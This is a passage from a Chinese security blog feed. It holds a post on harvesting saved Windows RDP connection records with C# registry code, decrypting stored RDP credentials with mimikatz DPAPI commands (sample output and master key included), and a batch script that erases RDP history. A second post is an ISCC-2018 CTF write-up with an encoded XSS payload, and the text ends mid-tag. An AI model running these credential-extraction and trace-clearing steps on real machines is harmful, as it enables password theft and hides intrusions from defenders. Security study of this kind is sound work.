class="line"></span><br><span class="line">        public static string[] GetRegSubkeys(string hive, string path)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                Microsoft.Win32.RegistryKey myKey = null;</span><br><span class="line">                if (hive == &quot;HKLM&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else if (hive == &quot;HKU&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                String[] subkeyNames = myKey.GetSubKeyNames();</span><br><span class="line">                return myKey.GetSubKeyNames();</span><br><span class="line">            &#125;</span><br><span class="line">            catch</span><br><span class="line">            &#123;</span><br><span class="line">                return new string[0];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void ListSavedRDPConnections()</span><br><span class="line">        &#123;</span><br><span class="line">            string[] SIDs = Registry.Users.GetSubKeyNames();</span><br><span class="line">            foreach (string SID in SIDs)</span><br><span class="line">            &#123;</span><br><span class="line">                if (SID.StartsWith(&quot;S-1-5&quot;) &amp;&amp; !SID.EndsWith(&quot;_Classes&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    string[] subkeys = GetRegSubkeys(&quot;HKU&quot;, String.Format(&quot;&#123;0&#125;\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;, SID));</span><br><span class="line">                    if (subkeys != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;\r\n\r\n=== Saved RDP Connection Information (&#123;0&#125;) ===&quot;, SID);</span><br><span class="line">                        foreach (string host in subkeys)</span><br><span class="line">                        &#123;</span><br><span class="line">                            string username = GetRegValue(&quot;HKCU&quot;, String.Format(&quot;Software\\Microsoft\\Terminal Server Client\\Servers\\&#123;0&#125;&quot;, host), &quot;UsernameHint&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;\r\n  Server : &#123;0&#125;&quot;, host);</span><br><span class="line">                            if (username != &quot;&quot;)</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(&quot;  User   : &#123;0&#125;&quot;, username);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            ListSavedRDPConnections();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/image/关于windows的RDP连接记录/blog_2018-11-30_18-25-46.png" alt=""></p><h2 id="0x02-破解RDP连接凭证"><a href="#0x02-破解RDP连接凭证" class="headerlink" title="0x02 破解RDP连接凭证"></a>0x02 破解RDP连接凭证</h2><p>破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。</p><p><img src="/image/关于windows的RDP连接记录/1.png" alt=""></p><h3 id="1、查找本地的Credentials"><a href="#1、查找本地的Credentials" class="headerlink" title="1、查找本地的Credentials"></a>1、查找本地的Credentials</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/2.png" alt=""></p><h3 id="2、使用mimikatz进行操作"><a href="#2、使用mimikatz进行操作" class="headerlink" title="2、使用mimikatz进行操作"></a>2、使用mimikatz进行操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6</span><br></pre></td></tr></table></figure><p>得到的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6</span><br><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;ffc994a1-de8d-4304-9416-31e587f7a8ca&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000030 - 48</span><br><span class="line">  szDescription      : Local Credential Data</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb</span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         :</span><br><span class="line">  algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530</span><br><span class="line">  dwDataLen          : 000000b0 - 176</span><br><span class="line">  pbData             : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a</span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8</span><br></pre></td></tr></table></figure><p>接下来需要使用的就是<code>guidMasterKey</code>、<code>pbData</code>数据。<strong>pbData是凭据的加密数据，guidMasterKey是凭据的GUID</strong></p><h3 id="3、使用sekurlsa-dpapi"><a href="#3、使用sekurlsa-dpapi" class="headerlink" title="3、使用sekurlsa::dpapi"></a>3、使用sekurlsa::dpapi</h3><p><img src="/image/关于windows的RDP连接记录/3.png" alt=""></p><p>根据目标凭据<code>GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}</code>找到其关联的<code>MasterKey</code>，这个<code>MasterKey</code>就是加密凭据的密钥，即<code>解密pbData</code>所必须的东西。</p><h3 id="4、解密"><a href="#4、解密" class="headerlink" title="4、解密"></a>4、解密</h3><p>命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c</span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/4.png" alt=""></p><h2 id="0x03-清除RDP连接历史记录"><a href="#0x03-清除RDP连接历史记录" class="headerlink" title="0x03 清除RDP连接历史记录"></a>0x03 清除RDP连接历史记录</h2><p>清除就相对简单一些。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Microsoft\Terminal Server Client\</span><br></pre></td></tr></table></figure><p>针对上述的<code>Default</code>、<code>Server</code>，对其表项进行删除</p><p><img src="/image/关于windows的RDP连接记录/5.png" alt=""></p><p>tips：由于在删除<code>Server表项</code>的时候无法一次选择所有表项，因为可以直接删除<code>整个Server</code>再新建。</p><p>除了删除注册表之外，要需要删除默认的RDP连接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f # 删除Default中的所有值</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f # 删除整个Servers</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项</span><br><span class="line">cd %userprofile%\documents\ # 转到Default.rdp文件目录</span><br><span class="line">attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏</span><br><span class="line">del Default.rdp  # 删除文件Default.rdp文件</span><br></pre></td></tr></table></figure><p>注意：在某些情况（比如系统盘空间不足）下，<code>Document</code>文件夹会从<code>%userprofile%\documents\</code>移动，所以特殊情况下，需要手动查找<code>Default.rdp</code></p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">获得Windows系统的远程桌面连接历史记录</a></p><p><a href="http://www.ansbase5.info/?p=535" target="_blank" rel="noopener">mimikatz获取本地Credentials</a></p><p><a href="https://www.t00ls.net/articles-41926.html#" target="_blank" rel="noopener">破解远程终端凭据，获取服务器密码</a></p><p><a href="http://woshub.com/how-to-clear-rdp-connections-history/#h2_3" target="_blank" rel="noopener">How to Clear RDP Connections History in Windows</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全,内网" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>ISCC-2018</title>
    <link href="https://rcoil.me/2018/05/ISCC-2018/"/>
    <id>https://rcoil.me/2018/05/ISCC-2018/</id>
    <published>2018-05-01T13:11:29.000Z</published>
    <updated>2018-05-25T15:04:13.658Z</updated>
    
    <content type="html"><![CDATA[<p>又一年，不过今年的质量有些…..</p><a id="more"></a><h2 id="0x01Misc"><a href="#0x01Misc" class="headerlink" title="0x01Misc"></a>0x01Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>附件地址：<a href="https://pan.baidu.com/s/1RFKBXgMtT4uF-MZ5gDQf9w" target="_blank" rel="noopener">What is that</a></p><p>查看图片信息，使用传统的方法解答没见效，使用<code>TweakPNG</code>查看图片信息。</p><p><img src="/image/ISCC-2018/MISC1-1.png" alt=""></p><p>将高度调整即可得到flag。</p><p><img src="/image/ISCC-2018/MISC1.png" alt=""></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>查看附件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">秘密电报：</span><br><span class="line">知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</span><br></pre></td></tr></table></figure><p>老司机一看就是培根密码了，flag为：<code>ILIKEISCC</code></p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>附件地址：<a href="https://pan.baidu.com/s/18ABDPnRwb0TrRezILokaQQ" target="_blank" rel="noopener">Where is the FLAG</a></p><p>题目：不只是Logo</p><p>查看详细信息，发现是由<code>Adobe Fireworks CS5</code>保存出来的图片，那就用<code>Adobe Fireworks CS5</code>打开。</p><p><img src="/image/ISCC-2018/MISC3.png" alt=""></p><p>调整画布大小，开始摆，得出一张二维码。<code>flag{a332b700-3621-11e7-a53b-6807154a58cf}</code></p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>附件地址：<a href="https://pan.baidu.com/s/1j2P-dyMOjONc7fFZrI2PFA" target="_blank" rel="noopener">一只猫的心思</a></p><p>题目：你能读懂它的心思吗？</p><p>使用<code>foremost</code>抽离图片，得到一个doc文件，打开，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密，得到一串16进制字符串，接下来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16进制--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本</span><br></pre></td></tr></table></figure><p>得到<code>F1a9_is_I5cc_ZOl8_G3TP01NT</code></p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>附件地址：<a href="https://pan.baidu.com/s/1TB3VVjeqYuNd4khsPHgntQ" target="_blank" rel="noopener">暴力XX不可取</a></p><p>题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</p><p>下载附件直接能解压，flag.txt的内容为<code>vfppjrnerpbzvat</code>，凯撒解密得出flag为：<code>isccwearecoming</code></p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</span><br></pre></td></tr></table></figure><p>一直<code>base64</code>解码，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=</span><br></pre></td></tr></table></figure><p>以<code>U2FsdGVkX1</code>开头的密文是<code>AES加密</code>，，然后使用<code>openssl</code>进行解密，顺带猜密码，最后在<a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">encrypt</a>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密得出flag为：<code>把我复制走</code></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</p><p>这个比较明显，就是取凯撒的13行，也就是<code>rot13</code>，结果是<code>roqtp697t95j3</code>，再进行键盘密码解密，得到flag为：<code>yougotme</code>，唯一的小坑就是对这个键盘密码的时候。</p><p><img src="/image/ISCC-2018/MISC7.png" alt=""></p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>附件地址<a href="https://pan.baidu.com/s/1SyD5RrVKI_fJFyrUymbSFw" target="_blank" rel="noopener">有趣的ISCC</a></p><p>题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</p><p>查看图片信息，最末尾发现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.9.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.4.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.5.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.9.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.3.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.1.0.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.1.0.0.;</span><br></pre></td></tr></table></figure><p>处理<a href="http://tool.oschina.net/encode" target="_blank" rel="noopener">还原</a>，得出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d</span><br></pre></td></tr></table></figure><p>再<a href="http://tool.oschina.net/encode?type=3" target="_blank" rel="noopener">还原</a>就成了<code>flag{iscc is fun}</code></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</p><p>16进制转个文本就行。</p><h3 id="挖宝计划"><a href="#挖宝计划" class="headerlink" title="挖宝计划"></a>挖宝计划</h3><p>题目附件：<a href="https://pan.baidu.com/s/1jK1onC1UwpXs3vQLZW8lzg" target="_blank" rel="noopener">挖宝计划</a></p><p>题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？</p><p>去年没解出来的数据分析题目。</p><p>查看zip的内容，发现是有解压密码的，但是不知道是什么，发现<code>zip</code>内也有一个<code>getFlag.py</code>，大小及<code>CRC值</code>一致，所以推断是存在明文攻击的解压漏洞。</p><p><img src="/image/ISCC-2018/MISC10.png" alt=""></p><p>但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;以文找文&quot;（寻&quot;文&quot;启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题</span><br></pre></td></tr></table></figure><p>降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。</p><h3 id="嵌套ZIPs"><a href="#嵌套ZIPs" class="headerlink" title="嵌套ZIPs"></a>嵌套ZIPs</h3><p>题目附件：<a href="https://pan.baidu.com/s/1VnYJc8JyfYlqDWmI2YZ1Ww" target="_blank" rel="noopener">嵌套ZIPs</a></p><p>题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？</p><p>看到<code>ZIPs</code>感觉就是一直要爆破的节奏。没什么思路那就爆破了。</p><p><img src="/image/ISCC-2018/MISC11.png" alt=""></p><p>解出来，又是明文攻击</p><p>ISCC_!S_my_favor1te_CTF</p><h2 id="0x02-Web"><a href="#0x02-Web" class="headerlink" title="0x02 Web"></a>0x02 Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><img src="/image/ISCC-2018/Web1.png" alt=""></p><p>限制了长度为3，将<code>maxlength</code>修改为大于3的值再输入超过3位数的数字即可，比如<code>maxlength=33</code>，输入值为<code>12345</code></p><p>或者直接抓包改值。</p><p><img src="/image/ISCC-2018/Web1-1.png" alt=""></p><p>flag为：<code>768HKyu678567&amp;*&amp;K</code></p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>页面显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Key Words:XSS</span><br><span class="line"></span><br><span class="line">如果你对xss了解的话,那你一定知道key是什么了，加油！</span><br><span class="line"></span><br><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure><p>对其中的base64编码进行解码，得出<code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script</code>，提交<code>/%nsfocusXSStest%/</code>即可得出flag</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" 